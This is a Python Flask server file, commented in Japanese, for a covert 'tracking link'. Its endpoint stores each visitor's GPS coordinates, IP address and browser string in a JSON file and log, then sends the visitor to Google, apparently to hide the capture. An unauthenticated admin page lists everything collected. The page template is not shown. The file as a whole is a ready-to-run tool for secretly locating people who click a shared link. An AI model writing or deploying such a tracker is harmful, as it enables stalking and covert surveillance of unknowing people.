# app.py
from flask import Flask, request, render_template, jsonify, redirect, send_from_directory
import os
import json
from datetime import datetime
import logging

# ロギングの設定
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("app.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# データを保存するファイルのパス
DATA_FILE = "location_data.json"

# アプリケーション起動時に既存のデータを読み込む
def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except json.JSONDecodeError:
            logger.error("データファイルの読み込みに失敗しました。")
            return []
    return []

# データを保存する関数
def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# グローバル変数としてデータを保持
location_data = load_data()

@app.route('/')
def index():
    """メインページを表示（直下のindex.htmlを配信）"""
    return send_from_directory('.', 'index.html')

@app.route('/tracking-link')
def tracking_link():
    """トラッキング用のページを表示"""
    return render_template('tracking.html')

@app.route('/submit-location', methods=['POST'])
def submit_location():
    """位置情報を受け取るエンドポイント"""
    try:
        data = request.json
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        timestamp = data.get('timestamp', datetime.now().isoformat())
        user_agent = request.headers.get('User-Agent')
        ip_address = request.remote_addr
        
        location_entry = {
            'latitude': latitude,
            'longitude': longitude,
            'timestamp': timestamp,
            'user_agent': user_agent,
            'ip_address': ip_address
        }
        
        location_data.append(location_entry)
        save_data(location_data)  # データをファイルに保存
        
        logger.info(f"位置情報を受信: {location_entry}")
        
        # Googleのリダイレクト先を返す
        return jsonify({'status': 'success', 'redirect': 'https://www.google.co.jp/'})
    except Exception as e:
        logger.error(f"エラーが発生しました: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/collect', methods=['GET'])
def collect_and_redirect():
    """GETリクエストで位置情報収集ページにリダイレクト"""
    return redirect('/tracking-link')

@app.route('/view-data')
def view_data():
    """収集した位置情報を表示するページ（管理者用）"""
    return render_template('data.html', location_data=location_data)

if __name__ == '__main__':
    # ポート5000でアプリケーションを起動（EC2で80ポートにリダイレクト設定済み）
    app.run(host='0.0.0.0', port=5000, debug=False)